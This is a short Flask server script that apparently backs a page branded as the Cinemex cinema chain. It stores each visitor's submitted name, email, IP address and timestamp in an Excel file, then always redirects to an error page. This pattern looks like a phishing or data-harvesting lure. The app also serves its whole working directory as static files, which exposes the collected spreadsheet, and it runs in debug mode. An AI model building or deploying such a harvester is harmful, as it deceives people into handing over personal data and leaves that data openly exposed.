from flask import Flask, request, redirect
from openpyxl import load_workbook, Workbook
from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
from datetime import datetime
import os

app = Flask(__name__, static_folder='.', static_url_path='')

EXCEL_FILE = 'datos_cinemex.xlsx'

def init_excel():
    if not os.path.exists(EXCEL_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Registros"

        headers = ["#", "Nombre", "Correo Electrónico", "Fecha y Hora", "IP"]
        ws.append(headers)

        header_fill = PatternFill("solid", start_color="CF0000")
        header_font = Font(bold=True, color="FFFFFF", name="Arial", size=11)
        center = Alignment(horizontal="center", vertical="center")
        thin = Side(style="thin", color="CCCCCC")
        border = Border(left=thin, right=thin, top=thin, bottom=thin)

        for col_idx, cell in enumerate(ws[1], 1):
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = center
            cell.border = border

        ws.column_dimensions['A'].width = 6
        ws.column_dimensions['B'].width = 30
        ws.column_dimensions['C'].width = 35
        ws.column_dimensions['D'].width = 22
        ws.column_dimensions['E'].width = 18
        ws.row_dimensions[1].height = 22

        wb.save(EXCEL_FILE)

def save_to_excel(nombre, correo, ip):
    init_excel()
    wb = load_workbook(EXCEL_FILE)
    ws = wb.active

    row_num = ws.max_row  # next row number (since row 1 is header)
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    thin = Side(style="thin", color="DDDDDD")
    border = Border(left=thin, right=thin, top=thin, bottom=thin)
    center = Alignment(horizontal="center", vertical="center")
    left = Alignment(horizontal="left", vertical="center")

    row_data = [row_num, nombre, correo, now, ip]
    ws.append(row_data)

    # Style the new row
    fill_color = "F9F9F9" if row_num % 2 == 0 else "FFFFFF"
    fill = PatternFill("solid", start_color=fill_color)

    for col_idx, cell in enumerate(ws[ws.max_row], 1):
        cell.border = border
        cell.fill = fill
        cell.font = Font(name="Arial", size=10)
        cell.alignment = center if col_idx in [1, 4, 5] else left

    ws.row_dimensions[ws.max_row].height = 18
    wb.save(EXCEL_FILE)

@app.route('/')
def index():
    return app.send_static_file('pag.html')

@app.route('/pag.html')
def pag():
    return app.send_static_file('pag.html')

@app.route('/error.html')
def error():
    return app.send_static_file('error.html')

@app.route('/submit', methods=['POST'])
def submit():
    nombre = request.form.get('nombre', '').strip()
    correo = request.form.get('correo', '').strip()
    ip = request.remote_addr
    save_to_excel(nombre, correo, ip)
    return redirect('/error.html')

if __name__ == '__main__':
    init_excel()
    app.run(debug=True, port=5000)